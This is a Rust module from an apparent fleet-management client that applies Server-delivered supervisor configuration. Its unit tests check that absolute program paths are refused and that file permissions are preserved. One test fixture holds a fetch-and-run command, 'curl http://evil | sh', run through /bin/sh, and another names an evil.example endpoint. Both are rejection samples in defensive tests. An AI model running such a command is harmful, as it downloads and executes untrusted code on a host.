//! The Supervisor-set apply (ADR-0056): what the Client does with a remote configuration offered
//! to its **own** Agent.
//!
//! Only the `[[supervisor]]` blocks of the offered document are read — every other top-level key
//! is ignored, because the rest of `client.toml` is host-local trust and wiring the Server must
//! never write. The offered set is validated against the running configuration's globals first;
//! then the Supervisors that left or changed are stopped, the merged document is written to
//! `client.toml` — surgically, so the operator's comments and layout survive — the removed
//! Supervisors' directories are purged (ADR-0059), and the changed and added Supervisors are
//! started from the file just written. Unchanged Supervisors ride through untouched.

use std::path::Path;

use opamp::proto::{AgentRemoteConfig, AgentToServer};
use tracing::{info, warn};

use crate::config::{redact_secrets, ClientConfig, SupervisorBlock};
use crate::engine::Engine;
use crate::service::runtime::Shutdown;

/// Applies an offered Supervisor set end to end and closes the self-Agent's `APPLYING` →
/// `APPLIED`/`FAILED` lifecycle. Returns the goodbyes of the retired Agents, for the transport
/// to send — the Baseline's `agent_disconnect` is the last message each of them says.
///
/// A failure before anything is stopped (parse, validation, a Client running without a
/// configuration path) applies nothing: the offer is reported `FAILED` and the running set stays
/// in force.
pub async fn apply(
    engine: &mut Engine,
    config: &mut ClientConfig,
    offer: AgentRemoteConfig,
    shutdown: &Shutdown,
) -> Vec<AgentToServer> {
    let hash = offer.config_hash.clone();
    match apply_inner(engine, config, &offer, shutdown).await {
        Ok(goodbyes) => {
            info!("supervisor set applied");
            engine.self_config_applied(hash, Ok(()));
            goodbyes
        }
        Err(Refused(error)) => {
            warn!(error = %error, "refusing the offered supervisor set");
            engine.self_config_applied(hash, Err(error));
            Vec::new()
        }
        Err(Failed(error, goodbyes)) => {
            warn!(error = %error, "the offered supervisor set failed to apply");
            engine.self_config_applied(hash, Err(error));
            goodbyes
        }
    }
}

use ApplyError::{Failed, Refused};

enum ApplyError {
    /// Nothing was touched: the running set stays in force.
    Refused(String),
    /// The apply began — Supervisors were stopped — and then failed; their goodbyes still have
    /// to go out.
    Failed(String, Vec<AgentToServer>),
}

async fn apply_inner(
    engine: &mut Engine,
    config: &mut ClientConfig,
    offer: &AgentRemoteConfig,
    shutdown: &Shutdown,
) -> Result<Vec<AgentToServer>, ApplyError> {
    let path = config
        .path
        .clone()
        .ok_or_else(|| Refused("this Client runs without a configuration file".to_string()))?;
    let (blocks, tables) = offered_blocks(offer).map_err(Refused)?;

    // The merge is: local globals, offered Supervisors. Validate the offered blocks against the
    // running globals exactly as startup would read them — before any running process is touched.
    let mut candidate = config.clone();
    candidate.supervisors = blocks.clone();
    for block in &blocks {
        validate_offered_block(&candidate, block).map_err(Refused)?;
    }

    // The apply is a diff, keyed by Supervisor name: removed and changed stop, changed and added
    // start, unchanged ride through (the point of managing the set from the Server).
    let stopping: Vec<String> = config
        .supervisors
        .iter()
        .filter(|old| blocks.iter().all(|new| new.name != old.name || new != *old))
        .map(|old| old.name.clone())
        .collect();
    let starting: Vec<String> = blocks
        .iter()
        .filter(|new| config.supervisors.iter().all(|old| old != *new))
        .map(|new| new.name.clone())
        .collect();
    let removed = removed_names(&config.supervisors, &blocks);

    let goodbyes = engine.retire_supervisors(&stopping).await;

    // Stopped, so the write comes next: a crash between the two restarts into the old file, one
    // after it into the new one — both build exactly what the file says, so both converge.
    let source = match write_supervisors(&path, tables) {
        Ok(source) => source,
        Err(e) => {
            // The old file still stands, so the old set is what this Client must run: bring the
            // stopped Supervisors back rather than leave them down with the file still naming
            // them.
            let error = format!("cannot write {}: {e}", path.display());
            restart_stopped(engine, config, &stopping, shutdown);
            return Err(Failed(error, goodbyes));
        }
    };

    // Written: the file no longer names the removed Supervisors, so their directories go with
    // them (ADR-0059) — program, packages, configuration, identity. The changed blocks in
    // `stopping` restart under their names and keep theirs.
    purge_removed(config, &removed);

    config.supervisors = blocks;
    let redacted = redact_secrets(&source);
    config.source = Some(redacted.clone());
    engine.set_self_effective_config(redacted);

    let mut errors = Vec::new();
    for name in starting {
        let Some(block) = config.supervisors.iter().find(|block| block.name == name) else {
            continue;
        };
        let index = engine.next_index();
        match crate::supervisor::start_supervisor(
            config,
            block,
            index,
            &engine.events_handle(),
            shutdown,
        ) {
            Ok(agent) => engine.add_supervisor(agent),
            Err(e) => errors.push(e),
        }
    }
    if errors.is_empty() {
        Ok(goodbyes)
    } else {
        Err(Failed(errors.join("; "), goodbyes))
    }
}

/// The names the offered set removed: present in the running blocks, absent — **by name** — from
/// the offered ones (ADR-0059). A changed block keeps its name and is stopped-and-restarted, not
/// removed, so its directory rides through.
fn removed_names(running: &[SupervisorBlock], offered: &[SupervisorBlock]) -> Vec<String> {
    running
        .iter()
        .filter(|old| offered.iter().all(|new| new.name != old.name))
        .map(|old| old.name.clone())
        .collect()
}

/// Deletes a removed Supervisor's directory whole — program, packages, configuration, and the
/// `instance-uid` whose Agent has already said its goodbye (ADR-0059). Runs only after the
/// rewritten `client.toml` no longer names the Supervisor: a failed write restarts the stopped
/// set from the old file, which needs the data intact. A directory that will not delete is a
/// warning, never a `FAILED` apply — the set the Server asked for is running; the leftover is an
/// orphan the next startup reports.
fn purge_removed(config: &ClientConfig, removed: &[String]) {
    for name in removed {
        let dir = config.supervisor_dir(name);
        match std::fs::remove_dir_all(&dir) {
            Ok(()) => {
                info!(supervisor = %name, path = %dir.display(), "removed supervisor purged");
            }
            // Never materialized (a block that failed to start owns no directory yet): purged is
            // what it already is.
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => warn!(
                supervisor = %name,
                path = %dir.display(),
                error = %e,
                "cannot purge the removed supervisor's directory"
            ),
        }
    }
}

/// Brings the Supervisors a failed apply had stopped back up from the still-standing old
/// configuration. A Supervisor that will not start again is a log line — the apply already
/// failed, and its status carries the error that matters.
fn restart_stopped(
    engine: &mut Engine,
    config: &ClientConfig,
    stopped: &[String],
    shutdown: &Shutdown,
) {
    for block in config
        .supervisors
        .iter()
        .filter(|block| stopped.contains(&block.name))
    {
        let index = engine.next_index();
        match crate::supervisor::start_supervisor(
            config,
            block,
            index,
            &engine.events_handle(),
            shutdown,
        ) {
            Ok(agent) => engine.add_supervisor(agent),
            Err(e) => {
                warn!(supervisor = %block.name, error = %e, "cannot restart after a failed apply")
            }
        }
    }
}

/// Reads the offered Supervisor set out of the composed config map (ADR-0056): every entry is
/// parsed as TOML, the union of their `[[supervisor]]` blocks is the set, and every other
/// top-level key is ignored — the boundary is enforced by what the Client takes. Returns the
/// parsed blocks beside their verbatim tables, which is what the write puts into `client.toml`
/// so the offered text survives as written.
///
/// # Errors
/// Returns an error for an entry that is not TOML, a `supervisor` key that is not an array of
/// tables, a block the startup parser would refuse, or a duplicate Supervisor name — a genuine
/// ambiguity inside the accepted scope.
fn offered_blocks(
    offer: &AgentRemoteConfig,
) -> Result<(Vec<SupervisorBlock>, Vec<toml_edit::Table>), String> {
    let map = offer
        .config
        .as_ref()
        .map(|c| &c.config_map)
        .ok_or_else(|| "the offer carries no configuration".to_string())?;
    // Entries in name order: the composed map is unordered on the wire, and the written file
    // should not depend on iteration luck.
    let mut entries: Vec<(&String, &opamp::proto::AgentConfigObject)> = map.iter().collect();
    entries.sort_by_key(|(name, _)| name.as_str());

    let mut blocks = Vec::new();
    let mut tables = Vec::new();
    for (entry, file) in entries {
        let text = std::str::from_utf8(&file.body)
            .map_err(|_| format!("entry {entry:?} is not UTF-8 text"))?;
        // Parsed twice on purpose: serde carries the blocks through the same strict
        // `SupervisorBlock` parse the startup loader uses, and `toml_edit` carries their
        // verbatim text — comments included — into the rewritten file. Same parser family, same
        // text, so the two block lists align by position.
        let mut parsed: toml::Table =
            toml::from_str(text).map_err(|e| format!("entry {entry:?} is not TOML: {e}"))?;
        let doc: toml_edit::DocumentMut = text
            .parse()
            .map_err(|e| format!("entry {entry:?} is not TOML: {e}"))?;
        let Some(value) = parsed.remove("supervisor") else {
            // An entry without blocks contributes nothing — with every entry like this, the
            // offered set is empty and the apply stops every Supervisor.
            continue;
        };
        let toml::Value::Array(values) = value else {
            return Err(format!(
                "entry {entry:?}: `supervisor` must be an array of tables"
            ));
        };
        let verbatim = doc
            .get("supervisor")
            .and_then(supervisor_tables)
            .filter(|tables| tables.len() == values.len())
            .ok_or_else(|| format!("entry {entry:?}: `supervisor` must be an array of tables"))?;
        for (value, table) in values.into_iter().zip(verbatim) {
            let toml::Value::Table(raw) = value else {
                return Err(format!(
                    "entry {entry:?}: `supervisor` must be an array of tables"
                ));
            };
            let block =
                SupervisorBlock::try_from(raw).map_err(|e| format!("entry {entry:?}: {e}"))?;
            if blocks
                .iter()
                .any(|b: &SupervisorBlock| b.name == block.name)
            {
                return Err(format!(
                    "entry {entry:?}: duplicate supervisor name {:?}",
                    block.name
                ));
            }
            blocks.push(block);
            tables.push(table);
        }
    }
    Ok((blocks, tables))
}

/// Validates one offered `[[supervisor]]` block before any running process is touched: the startup
/// loader's own checks (block schema, program-path resolution, ports, timeouts — ADR-0056 point 2),
/// and then the delivery-path constraint of ADR-0057.
///
/// A Server-delivered block may name only a program **this Client owns** — a bare file name, whose
/// program lives in a directory this Client created and updates from signature-verified packages
/// (ADR-0021). An absolute path is the machine's own process; letting the Server spawn one would be
/// arbitrary code execution that never passes through package signing. This binds the delivery path
/// alone: an operator may still write an absolute-path Supervisor in `client.toml` by hand, a
/// different principal that `resolve_program` must keep serving — which is why the rule lives here
/// and not in path resolution.
fn validate_offered_block(config: &ClientConfig, block: &SupervisorBlock) -> Result<(), String> {
    crate::supervisor::validate_block(config, block)?;
    let program = crate::supervisor::resolve_block_program(config, block)?;
    if !program.owned {
        return Err(format!(
            "supervisor {:?}: a Server-delivered supervisor may run only a program this Client \
             owns — name it with a bare file name, not the absolute path {}",
            block.name,
            program.path.display()
        ));
    }
    Ok(())
}

/// The `[[supervisor]]` blocks of one parsed entry, whichever TOML spelling carried them —
/// an array of tables, or an inline array of inline tables. `None` when the key is neither.
fn supervisor_tables(item: &toml_edit::Item) -> Option<Vec<toml_edit::Table>> {
    match item {
        toml_edit::Item::ArrayOfTables(tables) => Some(tables.iter().cloned().collect()),
        toml_edit::Item::Value(toml_edit::Value::Array(array)) => array
            .iter()
            .map(|value| match value {
                toml_edit::Value::InlineTable(inline) => Some(inline.clone().into_table()),
                _ => None,
            })
            .collect(),
        _ => None,
    }
}

/// Replaces the `[[supervisor]]` blocks of `client.toml` with the offered ones and leaves every
/// other line of the file exactly as the operator wrote it — comments, ordering, formatting
/// (ADR-0056). A file that does not exist yet is created; the write goes through a sibling
/// temporary file so a crash never leaves a half-written configuration. Returns the new text.
fn write_supervisors(path: &Path, tables: Vec<toml_edit::Table>) -> Result<String, String> {
    let text = match std::fs::read_to_string(path) {
        Ok(text) => text,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
        Err(e) => return Err(format!("cannot read the current file: {e}")),
    };
    let mut doc: toml_edit::DocumentMut = text
        .parse()
        .map_err(|e| format!("the current file is not TOML: {e}"))?;
    doc.remove("supervisor");
    if !tables.is_empty() {
        let mut array = toml_edit::ArrayOfTables::new();
        for table in tables {
            array.push(table);
        }
        doc.insert("supervisor", toml_edit::Item::ArrayOfTables(array));
    }
    let new_text = doc.to_string();

    let tmp = path.with_extension("toml.tmp");
    write_replacement(&tmp, path, &new_text)?;
    // Windows cannot rename over an existing file; removing first opens a moment with no file,
    // which a crash turns into "the defaults run until the operator restores it" — the narrow
    // loss, against silently applying half a write.
    #[cfg(windows)]
    let _ = std::fs::remove_file(path);
    std::fs::rename(&tmp, path).map_err(|e| format!("cannot replace the file: {e}"))?;
    Ok(new_text)
}

/// Writes the new configuration to the temporary file the caller then renames over `client.toml`.
///
/// On Unix the temp file inherits the mode of the file it will replace — created with it, never
/// widened after — so the rename cannot loosen permissions. `client.toml` holds the OpAMP
/// credential in cleartext and is created `0600` (`config_init::write_new`); writing the temp file
/// at the default umask (`0644`) and renaming it over the original, as this did before, left that
/// credential world-readable after every Server-driven reconfigure (ADR-0056). A file that does not
/// exist yet falls back to `0600`, the same floor `write_new` uses. The operator's own mode, if
/// they widened or narrowed it deliberately, is preserved.
fn write_replacement(tmp: &Path, target: &Path, contents: &str) -> Result<(), String> {
    // Clear any temp left by a crashed earlier write, so the create below is fresh and its mode
    // actually takes effect (a mode is applied only when a file is created).
    let _ = std::fs::remove_file(tmp);
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::{OpenOptionsExt as _, PermissionsExt as _};
        let mode = std::fs::metadata(target)
            .map(|meta| meta.permissions().mode() & 0o777)
            .unwrap_or(0o600);
        options.mode(mode);
    }
    #[cfg(not(unix))]
    let _ = target;
    let mut file = options
        .open(tmp)
        .map_err(|e| format!("cannot write {}: {e}", tmp.display()))?;
    use std::io::Write as _;
    file.write_all(contents.as_bytes())
        .map_err(|e| format!("cannot write {}: {e}", tmp.display()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use opamp::proto::{AgentConfigMap, AgentConfigObject};

    fn offer_of(entries: &[(&str, &str)]) -> AgentRemoteConfig {
        AgentRemoteConfig {
            config: Some(AgentConfigMap {
                config_map: entries
                    .iter()
                    .map(|(name, body)| {
                        (
                            (*name).to_string(),
                            AgentConfigObject {
                                body: body.as_bytes().to_vec(),
                                ..Default::default()
                            },
                        )
                    })
                    .collect(),
            }),
            config_hash: b"hash".to_vec(),
        }
    }

    /// ADR-0056 point 1: only the `[[supervisor]]` blocks are read; a full `client.toml`-shaped
    /// document may be offered and exactly its fleet-manageable half takes effect.
    #[test]
    fn foreign_top_level_keys_are_ignored() {
        let offer = offer_of(&[(
            "fleet",
            r#"
            endpoint = "wss://evil.example/v1/opamp"
            state_dir = "/somewhere/else"

            [[supervisor]]
            type = "command"
            name = "agent"
            command = "agent"
            "#,
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].name, "agent");
    }

    /// A duplicate name is not a foreign key but a genuine ambiguity inside the accepted scope —
    /// within one entry or across two.
    #[test]
    fn duplicate_supervisor_names_fail_the_offer() {
        let block = "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n";
        let within = offer_of(&[("a", &format!("{block}{block}"))]);
        let err = offered_blocks(&within).expect_err("duplicate within an entry");
        assert!(err.contains("duplicate supervisor name"), "{err}");

        let across = offer_of(&[("a", block), ("b", block)]);
        let err = offered_blocks(&across).expect_err("duplicate across entries");
        assert!(err.contains("duplicate supervisor name"), "{err}");
    }

    /// A block the startup parser would refuse is refused here, naming the entry — the same
    /// strictness ADR-0008 asks of the file.
    #[test]
    fn a_malformed_block_names_its_entry() {
        let offer = offer_of(&[(
            "bad",
            "[[supervisor]]\ntype = \"command\"\ncommand = \"x\"\n",
        )]);
        let err = offered_blocks(&offer).expect_err("a block without a name");
        assert!(err.contains("\"bad\""), "{err}");
        assert!(err.contains("needs a `name`"), "{err}");
    }

    /// ADR-0057: a Server-delivered block that names an **absolute** program path is refused as a
    /// whole — that is the machine's own process, and letting the Server spawn one would run
    /// arbitrary code that never passed through package signing. The refusal names the block and the
    /// path, and (being a validation failure) leaves the running set and the file untouched.
    /// An absolute path that is genuinely absolute on the host running the test — a Unix path is
    /// only drive-relative on Windows, which resolves to a different refusal, so each platform uses
    /// its own. Forward slashes keep it a plain TOML string and are absolute on Windows all the same.
    fn machine_program() -> &'static str {
        if cfg!(windows) {
            "C:/Windows/System32/cmd.exe"
        } else {
            "/bin/sh"
        }
    }

    #[test]
    fn a_server_delivered_block_may_not_name_an_absolute_program() {
        let program = machine_program();
        let offer = offer_of(&[(
            "fleet",
            &format!(
                "[[supervisor]]\ntype = \"command\"\nname = \"shell\"\n\
                 command = \"{program}\"\nargs = [\"-c\", \"curl http://evil | sh\"]\n"
            ),
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let mut config: ClientConfig = toml::from_str("").expect("config");
        config.supervisors = blocks.clone();

        let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute path refused");
        assert!(err.contains("\"shell\""), "names the block: {err}");
        assert!(err.contains("only a program this Client owns"), "{err}");
        assert!(err.contains(program), "names the path: {err}");
    }

    /// The counterpart: a bare file name is a program this Client owns (ADR-0021), so a delivered
    /// block that names one is accepted — the ordinary, intended delivery shape.
    #[test]
    fn a_server_delivered_block_naming_a_bare_program_is_accepted() {
        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n",
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let mut config: ClientConfig = toml::from_str("").expect("config");
        config.supervisors = blocks.clone();

        validate_offered_block(&config, &blocks[0]).expect("a bare-name program is owned");
    }

    /// The constraint reaches every plugin's program key: a `collector` block whose `binary` is an
    /// absolute path is the machine's Collector, refused on the delivery path just like `command`.
    #[test]
    fn a_delivered_collector_binary_must_be_owned_too() {
        let program = machine_program();
        let offer = offer_of(&[(
            "fleet",
            &format!(
                "[[supervisor]]\ntype = \"collector\"\nname = \"otelcol\"\nbinary = \"{program}\"\n"
            ),
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let mut config: ClientConfig = toml::from_str("").expect("config");
        config.supervisors = blocks.clone();

        let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute binary refused");
        assert!(err.contains("only a program this Client owns"), "{err}");
        assert!(err.contains(program), "{err}");
    }

    /// The composed map may spread blocks over several entries (one per matching Configuration);
    /// the union is the set, in entry-name order.
    #[test]
    fn blocks_are_collected_across_entries_in_name_order() {
        let offer = offer_of(&[
            (
                "b-second",
                "[[supervisor]]\ntype = \"command\"\nname = \"two\"\ncommand = \"two\"\n",
            ),
            (
                "a-first",
                "[[supervisor]]\ntype = \"command\"\nname = \"one\"\ncommand = \"one\"\n",
            ),
        ]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let names: Vec<&str> = blocks.iter().map(|b| b.name.as_str()).collect();
        assert_eq!(names, vec!["one", "two"]);
    }

    /// The write replaces exactly the `[[supervisor]]` blocks. Everything the operator wrote —
    /// comments, ordering, unrelated sections — survives byte for byte (ADR-0056 point 4).
    #[test]
    fn the_write_replaces_blocks_and_keeps_the_operators_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("client.toml");
        std::fs::write(
            &path,
            "# where the fleet lives\nendpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
             # tuned by hand\nmax_message_size_bytes = 8388608\n\n\
             [[supervisor]]\ntype = \"command\"\nname = \"old\"\ncommand = \"old\"\n",
        )
        .expect("write");

        let offer = offer_of(&[(
            "fleet",
            "# rolled out fleet-wide\n[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
        )]);
        let (_, tables) = offered_blocks(&offer).expect("parse");
        let text = write_supervisors(&path, tables).expect("rewrite");

        assert!(text.contains("# where the fleet lives"));
        assert!(text.contains("# tuned by hand"));
        assert!(text.contains("max_message_size_bytes = 8388608"));
        assert!(text.contains("name = \"new\""));
        assert!(!text.contains("\"old\""));
        assert_eq!(std::fs::read_to_string(&path).expect("read back"), text);
        // And the result is a valid configuration the next startup will load.
        let parsed: ClientConfig = toml::from_str(&text).expect("the rewritten file parses");
        assert_eq!(parsed.supervisors.len(), 1);
        assert_eq!(parsed.supervisors[0].name, "new");
    }

    /// `client.toml` holds the OpAMP credential in cleartext and is created `0600`; the rewrite must
    /// not widen it. Before the fix, writing the temp file at the default umask and renaming it over
    /// the original left the file (and the credential) world-readable after a Server reconfigure.
    #[cfg(unix)]
    #[test]
    fn the_rewrite_keeps_the_files_restrictive_mode() {
        use std::os::unix::fs::PermissionsExt as _;

        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("client.toml");
        std::fs::write(
            &path,
            "endpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
             [auth]\nbearer_token = \"a-long-secret\"\n\n\
             [[supervisor]]\ntype = \"command\"\nname = \"old\"\ncommand = \"old\"\n",
        )
        .expect("write");
        // As the Client creates it (config_init::write_new): owner-only.
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600)).expect("chmod");

        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
        )]);
        let (_, tables) = offered_blocks(&offer).expect("parse");
        write_supervisors(&path, tables).expect("rewrite");

        let mode = std::fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "the rewrite kept the file owner-only, got {mode:o}"
        );
        // No temporary file is left behind carrying the same secret.
        assert!(
            !path.with_extension("toml.tmp").exists(),
            "no temp left behind"
        );
    }

    /// A file that does not exist yet is created no wider than the `0600` floor `write_new` uses —
    /// a delivered set that first materializes `client.toml` must not do so world-readable.
    #[cfg(unix)]
    #[test]
    fn a_freshly_created_file_is_owner_only() {
        use std::os::unix::fs::PermissionsExt as _;

        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("client.toml");
        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
        )]);
        let (_, tables) = offered_blocks(&offer).expect("parse");
        write_supervisors(&path, tables).expect("rewrite");

        let mode = std::fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "a new file is owner-only, got {mode:o}");
    }

    /// ADR-0059 point 1: removal is keyed by name. A block that *changed* keeps its name — it is
    /// stopped and restarted, never purged; only a name absent from the offered set is removed.
    #[test]
    fn removed_is_by_name_so_a_changed_block_is_not_removed() {
        let parse = |text: &str| -> Vec<SupervisorBlock> {
            let config: ClientConfig = toml::from_str(text).expect("parse");
            config.supervisors
        };
        let running = parse(
            "[[supervisor]]\ntype = \"command\"\nname = \"changed\"\ncommand = \"old\"\n\
             [[supervisor]]\ntype = \"command\"\nname = \"gone\"\ncommand = \"gone\"\n",
        );
        let offered =
            parse("[[supervisor]]\ntype = \"command\"\nname = \"changed\"\ncommand = \"new\"\n");
        assert_eq!(
            removed_names(&running, &offered),
            vec!["gone".to_string()],
            "the changed block stays; only the vanished name is removed"
        );
    }

    /// ADR-0059: the purge deletes exactly the removed Supervisor's directory — whole, identity
    /// included — leaves the neighbours untouched, and a directory that never materialized is
    /// nothing to report.
    #[test]
    fn the_purge_deletes_exactly_the_removed_supervisors_directory() {
        let dir = tempfile::tempdir().expect("tempdir");
        let config: ClientConfig = toml::from_str(&format!(
            "supervisor_dir = {:?}",
            dir.path().join("supervisors").to_string_lossy()
        ))
        .expect("config");
        let gone = config.supervisor_dir("gone");
        let stays = config.supervisor_dir("stays");
        std::fs::create_dir_all(gone.join("program")).expect("create");
        std::fs::write(gone.join("instance-uid"), "uid").expect("write");
        std::fs::create_dir_all(&stays).expect("create");
        std::fs::write(stays.join("instance-uid"), "uid").expect("write");

        purge_removed(&config, &["gone".to_string(), "never-started".to_string()]);

        assert!(!gone.exists(), "the removed supervisor's directory is gone");
        assert!(
            stays.join("instance-uid").is_file(),
            "a neighbour keeps its directory and identity"
        );
    }

    /// An offer whose entries carry no blocks empties the set: the file keeps its globals and
    /// loses its `[[supervisor]]` blocks.
    #[test]
    fn an_empty_offer_removes_every_block() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("client.toml");
        std::fs::write(
            &path,
            "endpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
             [[supervisor]]\ntype = \"command\"\nname = \"old\"\ncommand = \"old\"\n",
        )
        .expect("write");
        let (blocks, tables) = offered_blocks(&offer_of(&[("fleet", "")])).expect("parse");
        assert!(blocks.is_empty());
        let text = write_supervisors(&path, tables).expect("rewrite");
        assert!(!text.contains("supervisor"), "{text}");
        assert!(text.contains("endpoint"), "{text}");
    }
}
